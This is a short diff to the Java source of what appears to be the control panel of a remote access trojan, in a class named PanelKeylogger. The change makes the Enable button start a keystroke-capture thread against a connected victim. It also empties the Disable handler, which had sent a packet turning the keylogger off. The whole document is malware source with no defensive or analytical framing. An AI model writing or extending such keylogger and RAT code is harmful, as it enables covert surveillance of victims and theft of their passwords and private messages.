@@ -40,7 +40,7 @@ public class PanelKeylogger extends BaseControlPanel {
 		JToggleButton tglbtnEnable = new JToggleButton("Enable");
 		tglbtnEnable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				
+				new Thread(new KeyThread(getServer(), PanelKeylogger.this)).start();
 			}
 		});
 		buttonGroup.add(tglbtnEnable);
@@ -48,16 +48,7 @@ public class PanelKeylogger extends BaseControlPanel {
 		JToggleButton tglbtnDisable = new JToggleButton("Disable");
 		tglbtnDisable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				try {
-					getServer().addToSendQueue(new PacketBuilder(Plugin.STATUS_HEADER, getServer()) {
-						@Override
-						public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
-							dos.writeBoolean(false);
-						}
-					});
-				} catch (Exception e) {					
-					e.printStackTrace();
-				}				
+					
 			}
 		});
 		buttonGroup.add(tglbtnDisable);
